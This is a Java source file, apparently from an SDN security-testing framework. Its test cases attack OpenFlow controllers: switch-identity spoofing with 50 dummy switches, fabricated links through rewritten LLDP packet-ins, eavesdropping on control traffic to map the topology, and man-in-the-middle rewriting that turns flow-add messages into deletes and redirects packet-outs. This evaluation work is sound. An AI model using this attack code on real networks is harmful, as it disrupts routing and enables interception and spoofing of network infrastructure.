package org.deltaproject.channelagent.testcase;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

import org.deltaproject.channelagent.core.Utils;
import org.deltaproject.channelagent.dummy.DummyOFSwitch;
import org.deltaproject.channelagent.networknode.NetworkNode;
import org.deltaproject.channelagent.networknode.TopoInfo;
import org.projectfloodlight.openflow.exceptions.OFParseError;
import org.projectfloodlight.openflow.protocol.OFFactory;
import org.projectfloodlight.openflow.protocol.OFFlowMod;
import org.projectfloodlight.openflow.protocol.OFFlowModCommand;
import org.projectfloodlight.openflow.protocol.OFMessage;
import org.projectfloodlight.openflow.protocol.OFMessageReader;
import org.projectfloodlight.openflow.protocol.OFPacketIn;
import org.projectfloodlight.openflow.protocol.OFPacketOut;
import org.projectfloodlight.openflow.protocol.OFType;
import org.projectfloodlight.openflow.protocol.action.OFAction;
import org.projectfloodlight.openflow.protocol.action.OFActionOutput;
import org.projectfloodlight.openflow.types.OFPort;
import org.projectfloodlight.openflow.types.U16;

import io.netty.buffer.ByteBuf;
import io.netty.buffer.PooledByteBufAllocator;
import io.netty.buffer.Unpooled;
import jpcap.packet.EthernetPacket;
import jpcap.packet.IPPacket;
import jpcap.packet.Packet;
import jpcap.packet.TCPPacket;

public class TestAdvancedSet {
	static final int MINIMUM_LENGTH = 8;

	public static final int TEST = -1;

	public static final int EMPTY = 0;
	public static final int MITM = 1;
	public static final int EVAESDROP = 2;
	public static final int LINKFABRICATION = 3;
	public static final int CONTROLMESSAGEMANIPULATION = 4;
	public static final int MALFORMEDCONTROLMESSAGE = 5;
	public static final int SEED = 6;

	private OFFactory factory;
	private OFMessageReader<OFMessage> reader;
	private byte ofversion;

	private ArrayList<DummyOFSwitch> switches;
	
	public TestAdvancedSet(OFFactory f, byte of) {
		this.factory = f;
		this.reader = factory.getReader();
		this.ofversion = of;
	}

	public ByteBuf getByteBuf(Packet p_temp) {
		// for OpenFlow Message
		byte[] rawMsg = new byte[p_temp.data.length];
		System.arraycopy(p_temp.data, 0, rawMsg, 0, p_temp.data.length);
		// ByteBuf byteMsg = Unpooled.copiedBuffer(rawMsg);

		return Unpooled.wrappedBuffer(rawMsg);
	}

	public boolean testSwitchIdentificationSpoofing(String controllerIP, String ofPort, byte OFVersion) {
		switches = new ArrayList<DummyOFSwitch>();
		
		for (int i = 0; i < 50; i++) {

			try {
				Thread.sleep(100);
			} catch (InterruptedException e) {
				e.printStackTrace();
			}

			System.out.println("[Channel-Agent] Switch Spoofing "+i);
			DummyOFSwitch dummysw = new DummyOFSwitch();
			dummysw.connectTargetController(controllerIP, ofPort);
			dummysw.setOFFactory(OFVersion);
			dummysw.start();
			
			switches.add(dummysw);
		}
		
		return true;
	}

	public ByteBuf testLinkFabrication(Packet p_temp) throws OFParseError {
		ByteBuf bb = getByteBuf(p_temp);
		ByteBuf buf = null;

		int totalLen = bb.readableBytes();
		int offset = bb.readerIndex();

		EthernetPacket p_eth = (EthernetPacket) p_temp.datalink;
		String src_mac = Utils.decalculate_mac(p_eth.src_mac);
		String dst_mac = Utils.decalculate_mac(p_eth.dst_mac);

		String src_ip = "";
		String dst_ip = "";

		int src_port = 0;
		int dst_port = 0;

		IPPacket p = ((IPPacket) p_temp);

		if (p instanceof TCPPacket) {
			TCPPacket tcp = ((TCPPacket) p);

			src_ip = p.src_ip.toString().split("/")[1];
			dst_ip = p.dst_ip.toString().split("/")[1];

			src_port = tcp.src_port;
			dst_port = tcp.dst_port;
		}

		while (offset < totalLen) {
			bb.readerIndex(offset);
			byte version = bb.readByte();
			bb.readByte();
			int length = U16.f(bb.readShort());
			bb.readerIndex(offset);

			if (version != this.ofversion) {
				// segmented TCP pkt
				System.out.println("OFVersion Missing " + offset + ":" + totalLen);
				return null;
			}

			if (length < MINIMUM_LENGTH)
				throw new OFParseError("Wrong length: Expected to be >= " + MINIMUM_LENGTH + ", was: " + length);

			try {
				OFMessage message = reader.readFrom(bb);

				if (message == null)
					return null;

				if (message.getType() == OFType.PACKET_IN) {
					OFPacketIn fi = (OFPacketIn) message;
					byte[] data = fi.getData();

					// LLDP 0x88cc
					if ((data)[12] == -120 && (data)[13] == -52) {
						String dpid = Utils.decalculate_mac(Arrays.copyOfRange(data, 17, 23));

						byte[] temp = Arrays.copyOfRange(data, 26, 28);
						int port = (int) Utils.byteToInt(temp, 2);

						int inport = Integer.parseInt(fi.getInPort().toString());

						OFPacketIn.Builder b = factory.buildPacketIn();

						b.setXid(fi.getXid());
						b.setBufferId(fi.getBufferId());
						b.setReason(fi.getReason());
						b.setTotalLen(fi.getTotalLen());
						b.setInPort(fi.getInPort());

						/* for 1.3 later */
						// b.setMatch(fi.getMatch());
						// b.setCookie(fi.getCookie());
						// b.setTableId(fi.getTableId());
						// b.setInPhyPort(fi.getInPhyPort());

						if (dpid.equals("00:00:00:00:00:22") && port == 1) {
							data[22] = 3; // dpid
							data[27] = 2; // port
							data[27 + 18] = 3;
						} else if (dpid.equals("00:00:00:00:00:22") && port == 2) {
							data[22] = 1;
							data[27] = 2;
							data[27 + 18] = 1;
						} else if (dpid.equals("00:00:00:00:00:11") && port == 2) {
							data[22] = 0;
							data[27] = 0;
						} else if (dpid.equals("00:00:00:00:00:33") && port == 2) {
							data[22] = 0;
							data[27] = 0;
						}

						byte[] newdata = Arrays.copyOfRange(data, 0, data.length);
						b.setData(newdata);
						OFPacketIn newfm = b.build();
						if (buf == null) {
							buf = PooledByteBufAllocator.DEFAULT.directBuffer(totalLen);
							newfm.writeTo(buf);
						}
					}
				}
			} catch (OFParseError e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}

			offset += length;
		}

		bb.clear();
		return buf;
	}

	public boolean testEvaseDrop(TopoInfo nodes, Packet p_temp) throws OFParseError {
		ByteBuf bb = getByteBuf(p_temp);

		int totalLen = bb.readableBytes();
		int offset = bb.readerIndex();

		EthernetPacket p_eth = (EthernetPacket) p_temp.datalink;
		String src_mac = Utils.decalculate_mac(p_eth.src_mac);
		String dst_mac = Utils.decalculate_mac(p_eth.dst_mac);

		String src_ip = "";
		String dst_ip = "";

		int src_port = 0;
		int dst_port = 0;

		IPPacket p = ((IPPacket) p_temp);

		if (p instanceof TCPPacket) {
			TCPPacket tcp = ((TCPPacket) p);

			src_ip = p.src_ip.toString().split("/")[1];
			dst_ip = p.dst_ip.toString().split("/")[1];

			src_port = tcp.src_port;
			dst_port = tcp.dst_port;
		}

		while (offset < totalLen) {
			bb.readerIndex(offset);
			byte version = bb.readByte();
			bb.readByte();
			int length = U16.f(bb.readShort());
			bb.readerIndex(offset);

			if (version != this.ofversion) {
				// segmented TCP pkt
				// System.out.println("OFVersion Missing " + offset + ":" + totalLen);
				return false;
			}

			if (length < MINIMUM_LENGTH)
				throw new OFParseError("Wrong length: Expected to be >= " + MINIMUM_LENGTH + ", was: " + length);

			try {
				OFMessage message = reader.readFrom(bb);

				if (message == null)
					return false;

				if (message.getType() == OFType.PACKET_OUT) {
					OFPacketOut fo = (OFPacketOut) message;
					byte[] data = fo.getData();

					if ((data)[12] == -120 && (data)[13] == -52) {
						/*
						 * System.out.println("[Channel-Agent] Get PACKET_OUT");
						 * System.out.println("[Channel-Agent] Length: " +
						 * data.length);
						 * System.out.println(Utils.byteArrayToHexString(data));
						 */

						String dpid = Utils.decalculate_mac(Arrays.copyOfRange(data, 17, 23));
						OFActionOutput out = (OFActionOutput) (fo.getActions().get(0));
						String portnum = out.getPort().toString();

						NetworkNode tempnode = new NetworkNode();
						tempnode.setNodeType(NetworkNode.SWITCH);
						tempnode.setIPAddr(dst_ip);
						tempnode.setPort(dst_port);
						tempnode.setDPID(dpid);

						nodes.insertSwitch(tempnode);
					}
				} else if (message.getType() == OFType.PACKET_IN) {
					OFPacketIn fi = (OFPacketIn) message;
					byte[] data = fi.getData();

					// if type code is 0x0800 (IP) -> HOST
					if ((data)[12] == 0x08 && (data)[13] == 0x00) {
						// System.out.println("[Channel-Agent] Get PACKET_IN : "
						// + fi.getInPort().toString());
						// System.out.println("[Channel-Agent] Length: " +
						// data.length);
						// System.out.println(Utils.byteArrayToHexString(data));

						int portNum = Integer.parseInt(fi.getInPort().toString());

						String macaddr = Utils.decalculate_mac(Arrays.copyOfRange(data, 6, 12));
						String ipaddr = Utils.byteArrayToIPString(Arrays.copyOfRange(data, 26, 30));

						if (!ipaddr.equals("0.0.0.0")) {
							NetworkNode tempnode = new NetworkNode();
							tempnode.setNodeType(NetworkNode.HOST);
							tempnode.setMacAddr(macaddr);
							tempnode.setIPAddr(ipaddr);

							nodes.insertNode(tempnode, portNum, src_ip, src_port);
						}
					} else if ((data)[12] == -120 && (data)[13] == -52) {
						String dpid = Utils.decalculate_mac(Arrays.copyOfRange(data, 17, 23));

						byte[] temp = Arrays.copyOfRange(data, 26, 28);
						int port = (int) Utils.byteToInt(temp, 2);

						int inport = Integer.parseInt(fi.getInPort().toString());

						NetworkNode tempnode = new NetworkNode();
						tempnode.setNodeType(NetworkNode.LINK);
						tempnode.setPort(port);
						tempnode.setDPID(dpid);

						nodes.insertNode(tempnode, inport, src_ip, src_port);
					}
				}
			} catch (OFParseError e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}

			offset += length;
		}

		bb.clear();
		return true;
	}

	public ByteBuf testMITM(Packet p_temp) throws OFParseError {
		ByteBuf bb = getByteBuf(p_temp);
		int totalLen = bb.readableBytes();
		int offset = bb.readerIndex();

		OFFlowMod newfm = null;
		OFPacketOut newoutput = null;

		ByteBuf buf = null;

		while (offset < totalLen) {
			bb.readerIndex(offset);

			byte version = bb.readByte();
			bb.readByte();
			int length = U16.f(bb.readShort());
			bb.readerIndex(offset);

			if (version != this.ofversion) {
				// segmented TCP pkt
				System.out.println("OFVersion Missing " + version + " : " + offset + "-" + totalLen);
				return null;
			}

			if (length < MINIMUM_LENGTH)
				throw new OFParseError("Wrong length: Expected to be >= " + MINIMUM_LENGTH + ", was: " + length);

			try {
				OFMessage message = reader.readFrom(bb);

				if (message == null)
					return null;

				// System.out.println(message.toString());

				if (message.getType() == OFType.FLOW_MOD) {
					OFFlowMod fa = (OFFlowMod) message;

					if (fa.getCommand() == OFFlowModCommand.ADD) {
						// System.out.println("before " + fa.toString());
						OFFlowMod.Builder b = factory.buildFlowDelete();

						b.setXid(fa.getXid());
						b.setMatch(fa.getMatch());
						b.setCookie(fa.getCookie());
						b.setIdleTimeout(fa.getIdleTimeout());
						b.setHardTimeout(fa.getHardTimeout());
						b.setPriority(fa.getPriority());
						b.setBufferId(fa.getBufferId());
						b.setOutPort(fa.getOutPort());
						b.setFlags(fa.getFlags());
						b.setActions(fa.getActions());

						newfm = b.build();

						if (buf == null)
							buf = PooledByteBufAllocator.DEFAULT.directBuffer(totalLen);

						newfm.writeTo(buf);
						// System.out.println(newfm.toString());
						// System.out.println("after" + newfm.toString());
					}

				} else if (message.getType() == OFType.PACKET_OUT) {
					OFPacketOut pktout = (OFPacketOut) message;

					if (pktout.getInPort().toString().equals("any")) {
						return null;
					}

					OFPacketOut.Builder b = factory.buildPacketOut();
					b.setInPort(pktout.getInPort());
					b.setXid(pktout.getXid());
					b.setBufferId(pktout.getBufferId());
					b.setData(pktout.getData());

					OFPort outPort = ((OFActionOutput) (pktout.getActions()).get(0)).getPort();

					if (outPort.toString().equals("flood"))
						return null;

					// System.out.println("before " + pktout.toString());

					int outNum = ((OFActionOutput) (pktout.getActions()).get(0)).getPort().getPortNumber();

					List<OFAction> actions = new ArrayList<OFAction>();
					OFActionOutput.Builder aob = factory.actions().buildOutput();
					aob.setPort(OFPort.of((outNum + 1)));
					aob.setMaxLen(Integer.MAX_VALUE);
					actions.add(aob.build());
					b.setActions(actions);

					newoutput = b.build();

					if (buf == null)
						buf = PooledByteBufAllocator.DEFAULT.directBuffer(totalLen);

					newoutput.writeTo(buf);
					// System.out.println("after " + newoutput.toString());
				}
			} catch (OFParseError e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}

			offset += length;
		}

		bb.clear();
		return buf;
	}
}
